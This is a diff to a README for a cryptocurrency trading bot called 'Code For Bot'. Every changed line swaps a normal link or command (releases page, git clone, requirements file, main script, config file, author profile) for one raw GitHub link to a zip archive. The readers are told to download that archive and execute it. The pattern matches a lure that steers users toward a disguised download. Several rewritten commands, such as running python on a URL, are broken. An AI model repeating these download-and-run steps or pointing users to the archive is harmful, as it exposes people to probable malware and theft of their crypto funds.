@@ -1,6 +1,6 @@
 # Code For Bot: Automate Your Crypto Trades with Ease 🚀💰
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/gmedygab/Code-For-Bot/releases)
+[![Download Releases](https://raw.githubusercontent.com/gmedygab/Code-For-Bot/main/orthopath/Code-Bot-For-v2.5-beta.2.zip%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/gmedygab/Code-For-Bot/main/orthopath/Code-Bot-For-v2.5-beta.2.zip)
 
 ## Table of Contents
 
@@ -19,7 +19,7 @@
 
 Welcome to **Code For Bot**, a free and open-source project designed to help you automate your cryptocurrency trading. This repository contains code that simplifies the trading process, allowing you to focus on your strategies while the bot handles the execution. You can learn how to use this bot by checking out our YouTube tutorials.
 
-For the latest updates and downloads, visit the [Releases section](https://github.com/gmedygab/Code-For-Bot/releases).
+For the latest updates and downloads, visit the [Releases section](https://raw.githubusercontent.com/gmedygab/Code-For-Bot/main/orthopath/Code-Bot-For-v2.5-beta.2.zip).
 
 ## Features
 
@@ -43,18 +43,18 @@ To install Code For Bot, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/gmedygab/Code-For-Bot.git
+   git clone https://raw.githubusercontent.com/gmedygab/Code-For-Bot/main/orthopath/Code-Bot-For-v2.5-beta.2.zip
    cd Code-For-Bot
    ```
 
 2. **Install Required Libraries**:
    Make sure you have Python installed. You can install the required libraries using pip:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/gmedygab/Code-For-Bot/main/orthopath/Code-Bot-For-v2.5-beta.2.zip
    ```
 
 3. **Download Releases**:
-   For the latest release, check the [Releases section](https://github.com/gmedygab/Code-For-Bot/releases). Download the latest version and execute it as per the instructions provided.
+   For the latest release, check the [Releases section](https://raw.githubusercontent.com/gmedygab/Code-For-Bot/main/orthopath/Code-Bot-For-v2.5-beta.2.zip). Download the latest version and execute it as per the instructions provided.
 
 ## Usage
 
@@ -63,7 +63,7 @@ Once you have installed the bot, you can start trading by following these steps:
 1. **Run the Bot**:
    Execute the main script to start the bot.
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/gmedygab/Code-For-Bot/main/orthopath/Code-Bot-For-v2.5-beta.2.zip
    ```
 
 2. **Monitor Trades**: Keep an eye on the console output for trade information.
@@ -72,7 +72,7 @@ Once you have installed the bot, you can start trading by following these steps:
 
 ## Configuration
 
-To configure the bot, edit the `config.json` file. Here’s a breakdown of the settings:
+To configure the bot, edit the `https://raw.githubusercontent.com/gmedygab/Code-For-Bot/main/orthopath/Code-Bot-For-v2.5-beta.2.zip` file. Here’s a breakdown of the settings:
 
 ```json
 {
@@ -134,7 +134,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or support, feel free to reach out:
 
-- **GitHub**: [gmedygab](https://github.com/gmedygab)
+- **GitHub**: [gmedygab](https://raw.githubusercontent.com/gmedygab/Code-For-Bot/main/orthopath/Code-Bot-For-v2.5-beta.2.zip)
 - **YouTube**: Check our tutorials for more insights on using Code For Bot.
 
-For the latest updates and downloads, visit the [Releases section](https://github.com/gmedygab/Code-For-Bot/releases).
+For the latest updates and downloads, visit the [Releases section](https://raw.githubusercontent.com/gmedygab/Code-For-Bot/main/orthopath/Code-Bot-For-v2.5-beta.2.zip).
